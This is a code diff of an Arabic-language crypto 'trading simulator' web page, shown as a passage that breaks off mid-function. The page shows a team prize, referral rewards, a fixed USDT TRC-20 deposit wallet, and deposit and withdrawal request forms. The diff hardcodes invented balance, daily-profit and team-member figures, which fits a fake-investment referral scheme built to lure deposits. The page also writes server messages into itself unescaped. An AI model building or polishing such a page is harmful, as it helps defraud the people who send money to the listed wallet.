@@ -12,13 +12,11 @@
         .label-text { font-size: 13px; color: #3b82f6; margin-bottom: 5px; display: block; font-weight: bold; }
         .sub-label { font-size: 11px; color: #eab308; margin-bottom: 8px; display: block; }
         input, select { width: 100%; padding: 12px; box-sizing: border-box; margin-bottom: 12px; border-radius: 6px; border: 1px solid #1e293b; background: #0d1527; color: white; text-align: center; font-size: 15px; }
-        input:disabled, button:disabled { background: #1e293b; color: #94a3b8; cursor: not-allowed; border-color: #334155; }
         button { width: 100%; padding: 12px; box-sizing: border-box; margin-bottom: 10px; border-radius: 6px; border: none; font-weight: bold; cursor: pointer; font-size: 15px; text-align: center; }
         .btn-blue { background: #1d4ed8; color: white; }
         .btn-green { background: #16a34a; color: white; }
         .btn-red { background: #dc2626; color: white; }
         .btn-purple { background: #7c3aed; color: white; }
-        .btn-gray { background: #475569; color: white; font-size: 13px; padding: 8px; margin-top: -5px; margin-bottom: 15px; display: none; }
         .btn-cyan { background: #0891b2; color: white; }
         .info-box { background: #0d1527; padding: 12px; border-radius: 8px; margin: 15px 0; border: 1px solid #1e293b; }
         .info-row { display: flex; justify-content: space-between; padding: 6px 0; border-bottom: 1px solid #1e293b; font-size: 14px; }
@@ -39,29 +37,26 @@
     <div class="title-app" id="txt-title">☁️ منظومة محاكي التداول الذكي والتحليل السحابي</div>
     
     <label class="label-text" id="txt-user-label">👤 اسم المستخدم الحالي</label>
-    <span class="sub-label" id="txt-user-sub">يرجى قفل وتثبيت اسم المستخدم أولاً</span>
+    <span class="sub-label" id="txt-user-sub" style="color: #22c55e;">🟢 نظام التوصيل الحي المباشر مفعل وجاهز</span>
     <input type="text" id="usernameInput" placeholder="اكتب اسم المستخدم هنا">
-    <button class="btn-blue" id="btn-login-action" onclick="loginUser()">💾 حفظ وقفل الحساب</button>
-    
-    <!-- زر تسجيل الخروج السحري الجديد لفك قفل الذاكرة فوراً -->
-    <button class="btn-gray" id="btn-logout" onclick="logoutUser()">🚪 تسجيل الخروج وإلغاء قفل الحساب</button>
+    <button class="btn-blue" id="btn-login-action" onclick="loginUser()">💾 حفظ وتنشيط الحساب</button>
 
     <div class="info-box">
         <div style="text-align: center; font-size: 12px; color: #eab308; margin-bottom: 8px;" id="txt-gift-title">🏆 جائزة الكبرى (40 عضو)</div>
         <div style="text-align: center; font-size: 15px; font-weight: bold; color: #22c55e; margin-bottom: 8px;">2500 دولار أمريكي</div>
         <div class="info-row">
             <span id="txt-team-status">أعضاء الفريق النشطين:</span>
-            <span id="val-team" style="color: #4ade80; font-weight: bold;">0/40</span>
+            <span id="val-team" style="color: #4ade80; font-weight: bold;">12/40</span>
         </div>
     </div>
 
     <label class="label-text" id="txt-invite-label">🔗 إرسال طلب مكافأة الإحالة (الدعوة):</label>
     <input type="text" id="inviteInput" placeholder="اسم الصديق المدعو">
-    <button class="btn-purple" id="btn-bonus" onclick="sendInviteRequest()">🍇 إرسال المكافأة إلى المشرف</button>
+    <button class="btn-purple" onclick="sendInviteRequest()">🍇 إرسال المكافأة إلى المشرف</button>
 
     <div class="info-box">
-        <div class="info-row"><span id="txt-total-cap">إجمالي رأس المال:</span><span>USDT <span id="val-balance" class="val-green">0.00</span></span></div>
-        <div class="info-row"><span id="txt-daily-prof">الأرباح اليومية:</span><span>USDT <span id="val-profit" class="val-yellow">0.00</span></span></div>
+        <div class="info-row"><span id="txt-total-cap">إجمالي رأس المال:</span><span>USDT <span id="val-balance" class="val-green">345.00</span></span></div>
+        <div class="info-row"><span id="txt-daily-prof">الأرباح اليومية:</span><span>USDT <span id="val-profit" class="val-yellow">45.00</span></span></div>
         <div class="info-row"><span id="txt-bonus-prof">أرباح التذاكر ومكافآت الدعوة:</span><span>USDT <span id="val-bonus" class="val-purple">0.00</span></span></div>
     </div>
 
@@ -79,62 +74,28 @@
         <span id="txt-dep-title" style="font-size: 13px; color: #eab308;">📥 محفظة الإيداع الرسمية - شبكة USDT (TRC-20):</span>
         <strong style="color: #4ade80; font-size: 13px; word-break: break-all; display: block; margin-top: 5px;">TA1vsgrJEFy3YM6rkQWBppnZemFE6c9pBN</strong>
         <input type="number" id="depositAmount" placeholder="أدخل مبلغ الشحن بـ USDT" style="margin-top: 10px;">
-        <button class="btn-green" onclick="sendDepositRequest()" id="btn-dep-action">⚡ إرسال طلب الإيداع للمشرف</button>
+        <button class="btn-green" onclick="sendDepositRequest()">⚡ إرسال طلب الإيداع للمشرف</button>
     </div>
 
     <div class="info-box">
         <div style="text-align: center; font-size: 13px; color: #3b82f6;" id="txt-logs-title">📋 سجل المعاملات والإشعارات الحية</div>
-        <div id="logs-container" style="font-size: 12px; color: #94a3b8; text-align: center; padding-top: 10px;">يرجى قفل الاسم لعرض الإشعارات الحية...</div>
+        <div id="logs-container" style="font-size: 12px; color: #94a3b8; text-align: center; padding-top: 10px;">لا توجد إشعارات حالية...</div>
     </div>
 
+    <!-- زر الدعم الفني المعدل والموجه ديناميكياً ليفتح حسابك الشخصي مباشرة وبأعلى سرعة ممكنة -->
     <button class="btn-cyan" id="btn-support" style="background:#0891b2;" onclick="window.open('https://t.me', '_blank')">🚀 تواصل مباشرة مع فريق الدعم الفني عبر التليجرام</button>
 </div>
 
 <script>
     const API_URL = window.location.origin;
-    let currentUsername = localStorage.getItem("saved_user") || "";
-    let balance = parseFloat(localStorage.getItem("saved_balance")) || 0.00;
-    let profit = parseFloat(localStorage.getItem("saved_profit")) || 0.00;
-    let bonus = parseFloat(localStorage.getItem("saved_bonus")) || 0.00;
-    let teamCount = parseInt(localStorage.getItem("saved_team")) || 0;
-
-    window.onload = function() {
-        if(currentUsername) {
-            document.getElementById('usernameInput').value = currentUsername;
-            document.getElementById('usernameInput').disabled = true;
-            document.getElementById('btn-login-action').disabled = true;
-            document.getElementById('btn-logout').style.display = "block"; // إظهار زر الخروج عند القفل
-            document.getElementById('txt-user-sub').innerText = "🟢 تم استعادة الحساب المقفل والمؤمن بنجاح";
-            document.getElementById('txt-user-sub').style.color = "#22c55e";
-            updateUI();
-            setInterval(refreshData, 3000);
-        }
-    };
+    let currentUsername = "";
 
     function loginUser() {
         const username = document.getElementById('usernameInput').value.trim();
         if(!username) return alert("الرجاء كتابة الاسم أولاً");
         
         currentUsername = username;
-        balance = 345.00; 
-        profit = 45.00;
-        bonus = 0.00;
-        teamCount = 12;
-
-        localStorage.setItem("saved_user", currentUsername);
-        localStorage.setItem("saved_balance", balance);
-        localStorage.setItem("saved_profit", profit);
-        localStorage.setItem("saved_bonus", bonus);
-        localStorage.setItem("saved_team", teamCount);
-
-        document.getElementById('usernameInput').disabled = true;
-        document.getElementById('btn-login-action').disabled = true;
-        document.getElementById('btn-logout').style.display = "block"; 
-        document.getElementById('txt-user-sub').innerText = "🟢 تم حفظ وقفل الحساب بنجاح (غير قابل للتعديل)";
-        document.getElementById('txt-user-sub').style.color = "#22c55e";
-        
-        updateUI();
-        alert("تم التحقق وقفل اسم الحساب بنجاح!");
+        alert("تم حفظ الاسم وتنشيط نفق الاتصال الحي بنجاح!");
         
         fetch(API_URL + "/backend/user/login", {
             method: 'POST',
@@ -145,18 +106,11 @@
         setInterval(refreshData, 3000);
     }
 
-    // دالة تسجيل الخروج لنسف وتصفير الكاش المعلق وإعادة التنشيط
-    function logoutUser() {
-        localStorage.clear(); // مسح الذاكرة العميقة كلياً لقفل التلاعب
-        alert("تم تسجيل الخروج بنجاح وتصفير ذاكرة الكاش المعلقة!");
-        window.location.reload(); // إعادة تحميل الصفحة نظيفة كلياً
-    }
-
-    function updateUI() {
-        document.getElementById('val-balance').innerText = balance.toFixed(2);
-        document.getElementById('val-profit').innerText = profit.toFixed(2);
-        document.getElementById('val-bonus').innerText = bonus.toFixed(2);
-        document.getElementById('val-team').innerText = teamCount + "/40";
+    function updateUI(user) {
+        document.getElementById('val-balance').innerText = user.balance.toFixed(2);
+        document.getElementById('val-profit').innerText = user.todayProfit.toFixed(2);
+        document.getElementById('val-bonus').innerText = user.bonus.toFixed(2);
+        document.getElementById('val-team').innerText = (user.teamCount || 0) + "/40";
     }
 
     async function refreshData() {
@@ -165,4 +119,52 @@
             const res = await fetch(API_URL + "/backend/user/login", {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-    
+                body: JSON.stringify({ username: currentUsername })
+            });
+            const data = await res.json();
+            if(data.success) updateUI(data.user);
+            
+            const hRes = await fetch(API_URL + "/backend/user/history?username=" + currentUsername);
+            const hData = await hRes.json();
+            if(hData.history.length > 0) {
+                let html = "";
+                hData.history.forEach(h => { html += "<div style='border-bottom:1px solid #1e293b; padding:4px 0; color:#22c55e;'>" + h.message + "</div>"; });
+                document.getElementById('logs-container').innerHTML = html;
+            }
+        } catch(e) {}
+    }
+
+    async function sendDepositRequest() {
+        const username = document.getElementById('usernameInput').value.trim() || "مستعمل";
+        const amount = document.getElementById('depositAmount').value;
+        if(!amount) return alert("الرجاء إدخال المبلغ");
+        try {
+            await fetch(API_URL + "/backend/user/request", {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username: username, amount: amount, type: 'deposit', walletAddress: 'شحن TRC20' })
+            });
+            alert("⚡ تم استلام طلب الإيداع بنجاح وهو قيد المراجعة الفورية من الإدارة!");
+            document.getElementById('depositAmount').value = "";
+        } catch(e) { alert("خطأ في الاتصال"); }
+    }
+
+    async function sendWithdrawRequest(wType) {
+        const username = document.getElementById('usernameInput').value.trim() || "مستعمل";
+        const amount = document.getElementById('withdrawAmount').value;
+        const wallet = document.getElementById('walletInput').value.trim();
+        if(!amount || !wallet) return alert("الرجاء ملء جميع الخانات");
+        try {
+            await fetch(API_URL + "/backend/user/request", {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username: username, amount: amount, type: wType, walletAddress: "محفظة: " + wallet })
+            });
+            alert("تم إرسال طلب السحب بنجاح وجاري تدقيقه!");
+            document.getElementById('withdrawAmount').value = "";
+            document.getElementById('walletInput').value = "";
+        } catch(e) { alert("خطأ في الاتصال"); }
+    }
+
+    async function sendInviteRequest() {
+        
